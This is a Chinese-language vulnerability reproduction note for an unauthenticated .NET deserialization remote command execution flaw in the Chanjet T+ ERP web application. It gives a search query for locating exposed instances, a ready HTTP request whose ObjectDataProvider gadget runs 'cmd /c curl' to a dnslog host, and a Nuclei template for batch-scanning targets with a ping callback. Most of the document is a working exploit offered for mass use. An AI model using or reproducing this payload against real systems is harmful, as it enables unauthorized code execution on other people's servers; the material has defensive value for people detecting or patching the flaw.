**漏洞简介**

 /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx接口存在.net反序列化漏洞，未经过身份认证的攻击者可以通过构造恶意的序列化请求在目标服务器上执行任意命令。

**漏洞复现**

步骤一：使用以下搜索语法获取测试资产并确定测试目标~~~

```
# 搜索语法app="畅捷通-TPlus"
```

步骤二：使用以下数据包进行命令执行测试并查看其DNSLog记录可得存在命令执行漏洞...

```YAML

POST /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/json
Content-Length: 614

{
  "storeID":{
    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "ObjectInstance":{
        "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "StartInfo": {
            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "FileName":"cmd", "Arguments":"/c curl 9o4ip1.dnslog.cn"
       }
    }
  }
}
```

执行命令并记录到对应的文件中...在从浏览器中进行访问获取命令执行结果...

**批量脚本**

```YAML
id: cjt-rce
 
info:
  name: cjt-rce
  author: ly
  severity: high
 
http:
  - raw:
      - |
        POST /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3157.54 Safari/537.36
        Connection: close
        Content-Type: application/json
 
        {
          "storeID": {
            "__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
            "MethodName": "Start",
            "ObjectInstance": {
              "__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
              "StartInfo": {
                "__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                "FileName": "cmd",
                "Arguments": "/c ping {{interactsh-url}}"
              }
            }
          }
        }
 
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
```

